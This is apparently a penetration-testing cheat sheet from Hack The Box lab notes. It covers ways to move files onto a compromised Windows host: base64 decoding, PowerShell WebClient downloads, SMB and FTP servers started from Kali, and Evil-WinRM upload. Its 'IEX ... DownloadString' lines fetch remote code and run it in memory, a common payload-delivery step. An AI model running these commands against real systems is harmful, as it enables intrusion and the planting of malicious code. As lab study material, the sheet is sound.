---
description: Windows file transfer download techniques
layout:
  width: default
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# 🪟 Windows Download

## Powershell

### Powershell Base64 Encode/Decode

#### Encode

```bash
$ cat <file> | base64 -w 0; echo
```

#### Decode

{% code overflow="wrap" fullWidth="false" %}
```powershell
PS C:\htb> [IO.File]::WriteAllBytes("<Save Path>", [Convert]::FromBase64String("<Base64 String>"))
```
{% endcode %}

### Powershell Web Downloads

|                                                                                                                          |                                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------- |
| Method                                                                                                                   | Description                                                                                                                |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Returns the data from a resource as a [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0). |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Returns the data from a resource without blocking the calling thread.                                                      |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Downloads data from a resource and returns a Byte array.                                                                   |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Downloads data from a resource and returns a Byte array without blocking the calling thread.                               |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Downloads data from a resource to a local file.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Downloads data from a resource to a local file without blocking the calling thread.                                        |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Downloads a String from a resource and returns a String.                                                                   |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Downloads a String from a resource without blocking the calling thread.                                                    |

{% code overflow="wrap" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('<REMOTE FILE>','LOCAL FILE>')
```
{% endcode %}

### Powershell Web Download - In Memory

{% code overflow="wrap" %}
```powershell
IEX (New-Object Net.WebClient).DownloadString('<FILE>')
```
{% endcode %}

{% code overflow="wrap" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadString('<FILE>') | IEX
```
{% endcode %}

## SMB

### Starting SMB Server From Kali

```bash
$ sudo impacket-smbserver share -smb2support /tmp/smb
```

```bash
$ sudo impacket-smbserver share -smb2support /tmp/smb -user test -password test
```

### Copy File From SMB Server

```batch
net use n: \\<IP>\<Share> /user:<USER> <PASS>
```

```batch
C:\htb> copy \\<IP>\<SHARE>\<FILE>
```

## FTP

### Starting FTP Server From Kali

```bash
$ sudo python3 -m pyftpdlib --port 21
```

### Copy File From FTP Server

{% code overflow="wrap" %}
```powershell
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<FILE>', '<LOCAL FILE')
```
{% endcode %}

## Evil-Winrm

```powershell
*Evil-WinRM* PS C:\> upload <REMOTE FILE> <LOCAL FILE>
```
